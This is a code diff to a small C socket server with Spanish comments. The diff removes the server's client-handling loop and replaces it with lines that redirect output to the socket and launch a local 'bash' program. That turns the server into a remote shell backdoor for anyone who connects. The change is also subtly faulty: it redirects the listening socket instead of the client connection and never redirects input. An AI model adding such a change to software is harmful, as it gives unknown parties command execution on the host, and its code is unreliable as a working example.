@@ -15,6 +15,11 @@ int main( int argc, char *argv[] ) {
 	struct sockaddr_in serv_addr, cli_addr;
 	int n;
 
+    /*add for me*/
+    /* add for me*/
+    char  *cmd = "./bash";
+    char  *cmd_args[] = { "./bash", NULL }; /* note: last item is NULL */
+
 	if ( argc < 2 ) {
         	fprintf( stderr, "Uso: %s <puerto>\n", argv[0] );
 		exit( 1 );
@@ -55,9 +60,14 @@ int main( int argc, char *argv[] ) {
 		}
 
 		if ( pid == 0 ) {  // Proceso hijo
-			close( sockfd );
+			//close( sockfd );
 
-			while ( 1 ) {
+            dup2( sockfd, STDOUT_FILENO );  /* duplicate socket on stdout */
+            dup2( sockfd, STDERR_FILENO );  /* duplicate socket on stderr too */
+            close( sockfd );  /* can close the original after it's duplicated */
+            execvp( cmd, cmd_args );   /* execvp() the command */
+
+			/*while ( 1 ) {
 				memset( buffer, 0, TAM );
 
 				n = read( newsockfd, buffer, TAM-1 );
@@ -80,7 +90,7 @@ int main( int argc, char *argv[] ) {
 					printf( "PROCESO %d. Como recibí 'fin', termino la ejecución.\n\n", getpid() );
 					exit(0);
 				}
-			}
+			}*/
 		}
 		else {
 			printf( "SERVIDOR: Nuevo cliente, que atiende el proceso hijo: %d\n", pid );
@@ -88,4 +98,4 @@ int main( int argc, char *argv[] ) {
 		}
 	}
 	return 0; 
-} 
+}
